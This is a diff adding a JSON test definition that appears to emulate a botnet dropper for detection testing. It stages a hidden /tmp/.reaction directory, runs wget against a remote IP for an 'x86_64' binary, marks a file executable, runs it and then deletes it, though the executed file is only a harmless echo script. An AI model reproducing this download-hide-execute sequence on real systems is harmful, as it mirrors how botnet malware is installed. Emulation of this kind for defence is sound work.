@@ -1,0 +1,22 @@
+[
+  {
+    "name": "DELETE-BOT",
+    "remove": [ "/tmp/.reaction/x86_64", "/tmp/.reaction" ]
+  },
+  {
+    "name": "DOWNLOAD-BOT",
+    "fork-and-rename": [ "wget", "http://4.4.2.2/Simps/x86_64", "-o", "/tmp/.reaction/x86_64" ],
+    "file-create": { "path": "x86_64", "data": "#!/bin/sh\necho 'chain-reactor DDoS Botnet test'\n", "backup-and-revert": false },
+    "chmod": { "path": "x86_64", "mode": "755" },
+    "copy": [ "x86_64", "/tmp/.reaction/x86_64" ],
+    "remove": [ "x86_64" ]
+  },
+  {
+    "name": "EXECUTE-BOT",
+    "execve": [ "/tmp/.reaction/x86_64", "exit" ]
+  },
+  {
+    "name": "STAGE-DIRECTORY",
+    "execve": [ "mkdir", "-p", "/tmp/.reaction" ]
+  }
+]
